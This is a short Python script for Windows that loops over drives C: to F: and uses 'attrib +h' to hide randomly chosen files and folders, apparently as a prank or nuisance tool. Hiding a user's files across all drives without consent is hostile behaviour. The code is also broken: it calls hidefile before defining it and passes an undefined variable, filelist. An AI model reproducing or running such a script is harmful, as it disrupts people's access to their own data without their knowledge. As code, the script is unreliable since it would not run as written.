#Windows version
import os
import random
drive = ['C:\\','D:\\','E:\\','F:\\']
for i in drive :
    os.chdir(i)
    FDlist = os.listdir(i)
    for i in FDlist :
        hidefile(filelist)
def hidefile(FD):
    path = random.choice(FD)
    os.system("attrib +h "+path)
